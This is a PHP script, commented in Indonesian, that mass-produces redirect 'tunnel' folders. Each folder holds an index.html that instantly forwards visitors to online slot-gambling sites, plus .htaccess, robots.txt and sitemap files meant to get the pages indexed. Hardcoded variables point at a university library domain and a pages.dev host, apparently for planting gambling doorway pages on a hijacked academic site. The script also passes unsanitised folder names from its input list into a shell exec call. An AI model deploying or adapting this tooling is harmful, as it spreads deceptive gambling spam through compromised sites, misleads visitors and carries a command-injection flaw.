<?php
/**
 * Tunnel Generator Script
 * Versi: Auto Buat Folder + index.html dengan Brand dan Konfigurasi Lanjutan
 * 
 * Format list.txt:
 * url|brand|subfolder(opsional)
 * Contoh: https://example.com|BrandName|custom-folder
 */

// Konfigurasi dasar
$config = [
    'listFile' => 'list.txt',
    'outputDir' => __DIR__ . '/generated',
    'templateFile' => 'template.html', // Template kustom (opsional)
    'createHtaccess' => true,          // Buat file .htaccess untuk keamanan
    'createRobotsTxt' => true,         // Buat file robots.txt untuk SEO
    'createSitemap' => true,           // Buat file sitemap.xml untuk SEO
    'generateFavicon' => true,         // Buat favicon dasar
    'logFile' => 'generator_log.txt',  // Log aktivitas
    'defaultBrand' => 'brand.txt',   // Brand default jika tidak disebutkan
    'indexToGoogle' => true,           // Tambahkan tag untuk Google indexing
];
$url = "https://opac.handayani.ac.id/";
$base_amp = "https://amp-ensign-edu-sa.pages.dev/";
$base_canonical = "https://opac.handayani.ac.id/";
$base_regis = "https://amp-ensign-edu-sa.pages.dev/";
$brand = ['brand' => 'brand.txt',];
// Template default HTML
$defaultTemplate = '<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="0; url={url}">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="{brand} - Situs resmi {brand} terpercaya yang bisa menghasilkan uang dengan sangat gampang dengan bermodalkan rendah 200 dan 400 perak">
  <meta name="robots" content="noindex, nofollow">
  <link rel="canonical" href="{url}">
  <title>{brand} - Taruhan Situs Judi Taruhan Slot {brand} Terbaik & Terpercaya di Tahun 2025</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background: #f5f5f5;
    }
    .loader {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #3498db;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h1>Mengarahkan ke {brand}...</h1>
  <div class="loader"></div>
  <p>Anda akan dialihkan ke situs resmi {brand} dalam beberapa detik.</p>
  <p>Jika tidak teralihkan secara otomatis, silakan <a href="{url}">klik di sini</a>.</p>
</body>
</html>';

// Template .htaccess untuk keamanan
$htaccessTemplate = '# Keamanan dasar
Options -Indexes
ServerSignature Off

# Mencegah akses ke file sensitif
<FilesMatch "^\.">
    Order allow,deny
    Deny from all
</FilesMatch>

# Mengalihkan semua permintaan ke index.html
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)$ index.html [L]
</IfModule>';

// Template robots.txt untuk SEO
$robotsTxtTemplate = $config['indexToGoogle'] ? 
    'User-agent: *
Allow: /
Sitemap: {url}/generated/sitemap.xml
' : 
    'User-agent: *
Disallow: /
';

// Template sitemap.xml
$sitemapTemplate = '<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
    <!-- Generated URLs will be added here -->
</urlset>';

// Template favicon SVG
$faviconSvgTemplate = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
    <rect width="16" height="16" fill="#24243e" />
    <text x="8" y="12" font-family="Arial" font-size="10" font-weight="bold" text-anchor="middle" fill="#ffffff">{initial}</text>
</svg>';

// Fungsi untuk mencatat log
function writeLog($message, $config) {
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($config['logFile'], "[$timestamp] $message" . PHP_EOL, FILE_APPEND);
}

// Mulai proses
echo "=== TUNNEL GENERATOR ===" . PHP_EOL;
echo "Memulai proses pembuatan tunnel..." . PHP_EOL;

// Validasi file daftar
if (!file_exists($config['listFile'])) {
    $errorMsg = "Error: File {$config['listFile']} tidak ditemukan.";
    echo $errorMsg . PHP_EOL;
    writeLog($errorMsg, $config);
    die();
}

// Baca template kustom jika ada
$template = $defaultTemplate;
if (file_exists($config['templateFile'])) {
    $template = file_get_contents($config['templateFile']);
    echo "Template kustom ditemukan dan digunakan." . PHP_EOL;
}

// Baca list
$list = file($config['listFile'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if (empty($list)) {
    $errorMsg = "Error: {$config['listFile']} kosong atau tidak berisi data yang valid.";
    echo $errorMsg . PHP_EOL;
    writeLog($errorMsg, $config);
    die();
}

// Buat direktori output jika belum ada
if (!is_dir($config['outputDir'])) {
    if (!mkdir($config['outputDir'], 0755, true)) {
        $errorMsg = "Error: Gagal membuat direktori output {$config['outputDir']}.";
        echo $errorMsg . PHP_EOL;
        writeLog($errorMsg, $config);
        die();
    }
    echo "Direktori output dibuat: {$config['outputDir']}" . PHP_EOL;
}

// Mulai pemrosesan
$count = 0;
$errors = 0;
$sitemapEntries = [];
echo "Memproses " . count($list) . " entri..." . PHP_EOL;

foreach ($list as $i => $line) {
    $index = $i + 1;
    $parts = explode('|', $line);
    
    // Parse data
    $url = trim($parts[0]);
    $brand = isset($parts[1]) && !empty(trim($parts[1])) ? trim($parts[1]) : $config['defaultBrand'];
    
    // Tentukan nama folder (gunakan subfolder kustom jika ada)
    $folderName = isset($parts[2]) && !empty(trim($parts[2])) ? trim($parts[2]) : "tunnel{$index}";
    $fullPath = $config['outputDir'] . "/" . $folderName;
    
    try {
        // Buat folder tunnel
        if (!is_dir($fullPath)) {
            if (!mkdir($fullPath, 0755, true)) {
                throw new Exception("Gagal membuat direktori {$fullPath}");
            }
        }
        
        // Generate content HTML
        $content = str_replace(
            ['{url}', '{brand}', '{initial}'], 
            [$url, htmlspecialchars($brand), strtoupper(substr($brand, 0, 1))], 
            $template
        );
        
        // Tulis file index.html
        if (file_put_contents($fullPath . '/index.html', $content) === false) {
            throw new Exception("Gagal menulis file index.html");
        }
        
        // Buat file .htaccess untuk keamanan jika diaktifkan
        if ($config['createHtaccess']) {
            file_put_contents($fullPath . '/.htaccess', $htaccessTemplate);
        }
        
        // Buat file robots.txt untuk SEO jika diaktifkan
        if ($config['createRobotsTxt']) {
            file_put_contents($fullPath . '/robots.txt', $robotsTxtTemplate);
        }
        
        // Buat favicon.ico dari SVG jika diaktifkan
        if ($config['generateFavicon']) {
            $faviconSvg = str_replace('{initial}', strtoupper(substr($brand, 0, 1)), $faviconSvgTemplate);
            file_put_contents($fullPath . '/favicon.svg', $faviconSvg);
            
            // Jika ada ImageMagick, konversi SVG ke ICO (opsional)
            if (function_exists('exec')) {
                @exec("convert {$fullPath}/favicon.svg {$fullPath}/favicon.ico");
            }
        }
        
        // Tambahkan entri ke sitemap jika diaktifkan
        if ($config['createSitemap']) {
            $sitemapEntries[] = "    <url>\n        <loc>http://your-domain.com/generated/{$folderName}/</loc>\n        <lastmod>" . date('Y-m-d') . "</lastmod>\n        <changefreq>monthly</changefreq>\n        <priority>0.8</priority>\n    </url>";
        }
        
        $count++;
        echo "✓ Berhasil: {$fullPath} (URL: {$url}, Brand: {$brand})" . PHP_EOL;
        writeLog("Tunnel dibuat: {$fullPath} -> {$url} ({$brand})", $config);
        
    } catch (Exception $e) {
        $errors++;
        echo "✗ Gagal: {$fullPath} - {$e->getMessage()}" . PHP_EOL;
        writeLog("Error: {$e->getMessage()} saat membuat {$fullPath}", $config);
    }
}

// Laporan hasil
echo PHP_EOL . "=== HASIL PROSES ===" . PHP_EOL;
echo "✅ Selesai! Berhasil generate {$count} folder dengan index.html." . PHP_EOL;

// Buat sitemap.xml jika diaktifkan
if ($config['createSitemap'] && !empty($sitemapEntries)) {
    $sitemap = str_replace('    <!-- Generated URLs will be added here -->', implode("\n", $sitemapEntries), $sitemapTemplate);
    file_put_contents($config['outputDir'] . '/sitemap.xml', $sitemap);
    echo "📝 Sitemap dibuat: {$config['outputDir']}/sitemap.xml" . PHP_EOL;
}

if ($errors > 0) {
    echo "⚠️ Terdapat {$errors} error selama proses." . PHP_EOL;
}

echo "Tunnel dapat diakses melalui: " . PHP_EOL;
echo "- Lokal: {$config['outputDir']}/{nama_folder}" . PHP_EOL;
echo "- Web: http://your-domain.com/generated/{nama_folder}" . PHP_EOL;
echo PHP_EOL . "Log proses disimpan di: {$config['logFile']}" . PHP_EOL;
